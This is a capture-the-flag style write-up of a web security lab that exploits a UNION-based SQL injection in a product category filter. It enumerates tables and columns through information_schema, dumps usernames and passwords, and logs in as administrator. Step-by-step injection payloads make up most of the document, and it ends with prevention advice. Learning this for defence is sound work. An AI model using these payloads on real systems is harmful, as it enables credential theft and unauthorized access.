# SQL injection attack, listing the database contents on non-Oracle databases


## Concept


The application contains a SQL Injection vulnerability in the product category filter.


The query results are displayed in the response, allowing a UNION attack to retrieve data from other database 
tables.


The goal is to discover the users table, extract usernames and passwords, then login as administrator.


---


## Vulnerability


User input is directly inserted into a SQL query:


```sql

SELECT * FROM products 

WHERE category = 'Gifts' AND released = 1

````


The category parameter can be manipulated using SQL Injection.


---


## Exploitation Steps


## 1. Confirm SQL Injection


Test with:


```sql

'

```


An SQL error appears, confirming that the input affects the SQL query.


---


## 2. Determine Number of Columns


Use UNION with NULL values:


```sql

' UNION SELECT NULL,NULL--

```


Adjust the number of NULL values until the query executes successfully.


---


## 3. Discover Database Tables


Use `information_schema.tables` to retrieve table names:


```sql

' UNION SELECT table_name,NULL FROM information_schema.tables--

```


The response contains many system tables.


Filter application tables:


```sql

' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--

```


Found users table:


```sql

users_rdlbjk

```

---


## 4. Discover Table Columns


Use `information_schema.columns`:


```sql

' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_rdlbjk'--

```


Found columns:


```text

username_xwprmg

password_nisrcu

```


---


## 5. Extract User Credentials


Retrieve usernames and passwords:


```sql

' UNION SELECT username_xwprmg,password_nisrcu FROM users_rdlbjk--

```


The response displays user credentials.


Use the administrator password to login and solve the lab.

---



## Attack Flow



```

Find SQL Injection

        ↓

Find number of columns

        ↓

Enumerate tables

        ↓

Find columns

        ↓

Extract credentials

        ↓

Login as administrator

```



---


## Key Takeaways


* UNION attacks can retrieve data from other database tables.

* `information_schema` contains metadata about databases.

* Table names are not always predictable.

* Column names must be discovered before extracting data.

* Database enumeration is a common SQL Injection technique.



---


## Prevention


* Use Prepared Statements / Parameterized Queries.

* Avoid concatenating user input into SQL queries.

* Apply least privilege to database accounts.



```